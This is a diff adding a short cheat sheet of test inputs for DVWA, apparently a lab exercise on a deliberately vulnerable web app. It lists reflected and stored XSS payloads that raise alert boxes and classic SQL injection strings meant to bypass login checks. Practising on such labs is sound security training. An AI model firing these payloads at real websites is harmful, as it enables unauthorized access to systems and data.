@@ -1,0 +1,28 @@
+========================================
+DVWA Vulnerability Testing Commands
+========================================
+
+# Reflected XSS
+<script>alert('how are u')</script>
+
+
+# Stored XSS
+
+Name:
+John
+
+Message:
+<script>alert('Stored XSS Working!')</script>
+
+Submit the form (Sign Guestbook / Submit).
+
+
+# SQL Injection
+
+1' OR '1'='1
+
+' OR '1'='1' --
+
+admin' --
+
+' OR 1=1 #
